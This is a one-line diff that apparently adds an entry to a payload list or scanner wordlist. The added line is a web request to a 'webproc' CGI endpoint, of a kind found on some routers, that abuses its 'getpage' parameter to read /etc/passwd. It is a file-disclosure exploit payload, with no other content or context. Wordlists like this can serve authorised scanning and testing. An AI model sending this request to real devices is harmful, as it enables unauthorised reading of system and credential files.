@@ -1,0 +1,1 @@
+/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo
